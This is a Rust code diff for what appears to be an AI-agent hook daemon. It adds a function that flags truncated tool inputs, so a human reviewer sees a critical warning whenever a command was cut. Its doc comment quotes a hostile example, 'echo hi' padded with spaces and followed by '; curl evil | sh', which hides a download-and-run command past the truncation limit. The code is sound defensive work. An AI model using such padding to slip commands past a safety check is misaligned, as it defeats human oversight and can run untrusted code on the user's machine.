@@ -42,6 +42,41 @@ pub struct Hook<'a> {
     pub permission_mode: Option<&'a str>,
 }
 
+/// The key `agentnest-hook` (the command-hook relay) adds at the top level of a hook body when it had to cut a string
+/// field above 32 KiB: `["tool_input.command", ...]` (integrations/claude-code.md 3).
+pub const TRUNCATED_MARKER_KEY: &str = "_agentnest_truncated";
+
+/// The `tool_input` to classify and hash for a hook body: the input itself, plus - when the CLI relay reported that it
+/// **cut** something inside `tool_input` - the marker [`TRUNCATED_MARKER_KEY`] inside it.
+///
+/// A cut input cannot be judged: `echo hi<33,000 spaces>; curl evil | sh` is cut to `echo hi<spaces>` and would look
+/// harmless, while the same call over an HTTP hook is seen whole. The classifier treats the marker (and any string field
+/// of 32 KiB or more) as `critical` / `input_too_large` ([`crate::risk::classify`]), so the human sees a red card
+/// instead of a mild one. The daemon's own copy of the input is otherwise untouched.
+pub fn tool_input_with_truncation_marker(tool_input: &Value, hook: &Value) -> Value {
+    let Some(Value::Array(marked)) = hook.get(TRUNCATED_MARKER_KEY) else {
+        return tool_input.clone();
+    };
+    let concerns_tool_input = marked
+        .iter()
+        .filter_map(Value::as_str)
+        .any(|p| p == "$" || p.starts_with("tool_input"));
+    if !concerns_tool_input {
+        return tool_input.clone();
+    }
+    match tool_input {
+        Value::Object(map) => {
+            let mut map = map.clone();
+            map.insert(TRUNCATED_MARKER_KEY.to_owned(), Value::Array(marked.clone()));
+            Value::Object(map)
+        }
+        other => serde_json::json!({
+            TRUNCATED_MARKER_KEY: marked,
+            "tool_input": other,
+        }),
+    }
+}
+
 /// A non-empty string field.
 pub fn str_field<'a>(v: &'a Value, key: &str) -> Option<&'a str> {
     v.get(key).and_then(Value::as_str).filter(|s| !s.is_empty())
